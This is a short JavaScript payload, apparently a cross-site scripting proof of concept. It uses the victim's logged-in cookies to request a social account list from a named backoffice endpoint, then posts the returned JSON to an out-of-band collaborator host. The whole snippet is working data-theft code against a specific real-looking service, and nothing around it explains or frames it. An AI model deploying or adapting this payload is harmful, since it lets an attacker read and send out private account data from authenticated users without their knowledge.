(async function() {
    const response = await fetch("https://ristretto.wildmoka.com/backoffice/social/account/list?", {
        method: "GET",
        credentials: "include"
    });
    const data = await response.json();
    await fetch("https://yacq4mjqetcc51580vf5t4460x6ouji8.oastify.com", {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    });
})();